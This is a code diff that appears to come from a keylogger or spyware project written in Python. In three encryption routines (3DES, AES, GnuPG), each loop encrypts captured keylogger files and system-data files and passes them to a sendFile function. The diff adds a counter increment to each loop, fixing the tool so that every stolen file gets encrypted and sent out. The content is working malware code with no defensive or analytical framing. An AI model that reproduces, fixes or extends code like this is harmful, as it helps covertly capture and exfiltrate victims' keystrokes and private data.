@@ -213,6 +213,7 @@ def des3_encrypt(key):
             with open(systemencrypted_file_names[count], 'wb') as f:
                 f.write(encrypted_text)
             sendFile(systemencrypted_file_names[count], True)
+            count = count + 1
     count = 0
     for encryptingFile in keyloggerfiles_to_encrypt:
         with open(keyloggerfiles_to_encrypt[count], 'rb') as f:
@@ -228,6 +229,7 @@ def des3_encrypt(key):
             with open(keylogger_encrypt_filename[count], 'wb') as f:
                 f.write(encrypted_text)
             sendFile(keylogger_encrypt_filename[count], False)
+            count = count + 1
     return key
 
 
@@ -247,6 +249,7 @@ def encrypt_aes(key):
             with open(systemencrypted_file_names[count], 'wb') as f:
                 f.write(base64.b64encode(iv + cipher.encrypt(new_text)))
             sendFile(systemencrypted_file_names[count], True)
+            count = count + 1
     count = 0
     for encryptingFile in keyloggerfiles_to_encrypt:
         with open(keyloggerfiles_to_encrypt[count], 'rb') as f:
@@ -257,6 +260,7 @@ def encrypt_aes(key):
             with open(keylogger_encrypt_filename[count], 'wb') as f:
                 f.write(base64.b64encode(iv + cipher.encrypt(new_text)))
             sendFile(keylogger_encrypt_filename[count], False)
+            count = count + 1
     return key
 
 
@@ -276,6 +280,7 @@ def encrypt_gnupg(email, key):
                 f, recipients=[email],
                 output=systemencryptedFileNames[count] + '.gpg')
             sendFile(systemencryptedFileNames[count], True)
+        count = count + 1
     count = 0
     for encryptingFile in keyloggerfilesToEncrypt:
         with open(keyloggerfilesToEncrypt[count], 'rb') as f:
@@ -283,6 +288,7 @@ def encrypt_gnupg(email, key):
                 f, recipients=[email],
                 output=keyloggerencryptname[count] + '.gpg')
             sendFile(keyloggerencryptname[count], False)
+        count = count + 1
     return key
 
 
